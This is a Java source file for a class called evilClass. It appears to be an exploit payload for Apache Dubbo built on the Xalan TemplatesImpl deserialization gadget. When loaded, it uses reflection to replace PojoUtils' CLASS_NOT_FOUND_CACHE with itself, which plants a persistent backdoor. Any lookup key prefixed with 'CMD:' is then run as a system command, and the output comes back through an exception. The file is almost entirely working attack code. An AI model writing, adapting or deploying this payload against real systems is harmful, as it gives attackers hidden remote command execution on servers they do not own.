
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.dubbo.common.utils.PojoUtils;


import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.charset.Charset;
import java.util.Collection;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentMap;
import java.util.function.BiConsumer;
import java.util.function.BiFunction;
import java.util.function.Function;

public class evilClass extends AbstractTranslet  implements ConcurrentMap {
    private HashMap m = new HashMap();
    public static final String CMD_PREFIX = "CMD:";
    public static final String CMD_SPLIT = "@cmdEcho@";
    @Override
    public Object getOrDefault(Object key, Object defaultValue) {
        return m.getOrDefault(key,defaultValue);
    }

    @Override
    public void forEach(BiConsumer action) {
        m.forEach(action);
    }

    @Override
    public void replaceAll(BiFunction function) {
        m.replaceAll(function);
    }

    @Override
    public Object putIfAbsent(Object key, Object value) {
        return m.putIfAbsent(key,value);
    }

    @Override
    public boolean remove(Object key, Object value) {
        return m.remove(key,value);
    }

    @Override
    public boolean replace(Object key, Object oldValue, Object newValue) {
        return m.replace(key,oldValue,newValue);
    }

    @Override
    public Object replace(Object key, Object value) {
        return m.replace(key,value);
    }

    @Override
    public Object computeIfAbsent(Object key, Function mappingFunction) {
        return m.computeIfAbsent(key,mappingFunction);
    }

    @Override
    public Object computeIfPresent(Object key, BiFunction remappingFunction) {
        return m.computeIfPresent(key,remappingFunction);
    }

    @Override
    public Object compute(Object key, BiFunction remappingFunction) {
        return compute(key,remappingFunction);
    }

    @Override
    public Object merge(Object key, Object value, BiFunction remappingFunction) {
        return m.merge(key,value,remappingFunction);
    }

    @Override
    public int size() {
        return m.size();
    }

    @Override
    public boolean isEmpty() {
        return m.isEmpty();
    }

    @Override
    public boolean containsKey(Object key) {
        StringBuffer b = new StringBuffer();
        if( key.toString().startsWith(CMD_PREFIX)) {
            b.append(CMD_SPLIT);
            try{
                Process p = Runtime.getRuntime().exec(key.toString().substring(5).split(" "));
                InputStream fis = p.getInputStream();
                InputStreamReader isr;
                if (key.toString().substring(4,5).equals("g")) {
                    isr = new InputStreamReader(fis,Charset.forName("GBK"));
                }else {
                    isr = new InputStreamReader(fis);
                }
                BufferedReader br = new BufferedReader(isr);
                String line = null;
                while((line = br.readLine()) != null) {
                    b.append(line+"\n");
                }
            }catch (Exception e){

            }
            b.append(CMD_SPLIT);
            throw new IllegalArgumentException(b.toString());
        }
        return m.containsKey(key);
    }

    @Override
    public boolean containsValue(Object value) {
        return m.containsValue(value);
    }

    @Override
    public Object get(Object key) {

        return m.get(key);
    }

    @Override
    public Object put(Object key, Object value) {
        return m.put(key,value);
    }

    @Override
    public Object remove(Object key) {
        return m.remove(key);
    }

    @Override
    public void putAll(Map ma) {
        m.putAll(m);

    }

    @Override
    public void clear() {
        m.clear();

    }

    @Override
    public Set keySet() {
        return m.keySet();
    }

    @Override
    public Collection values() {
        return m.values();
    }

    @Override
    public Set<Entry> entrySet() {
        return m.entrySet();
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public evilClass(String a) throws Exception{

    }
    public evilClass() throws Exception{
        try {
            addClass();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void addClass() throws Exception{
        Field mo = Field.class.getDeclaredField("modifiers");
        mo.setAccessible(true);
        Field field = PojoUtils.class.getDeclaredField("CLASS_NOT_FOUND_CACHE");
        field.setAccessible(true);
        mo.setInt(field,field.getModifiers()&~Modifier.FINAL);
        field.set(null,new evilClass(""));
        System.out.println("add success");
    }

}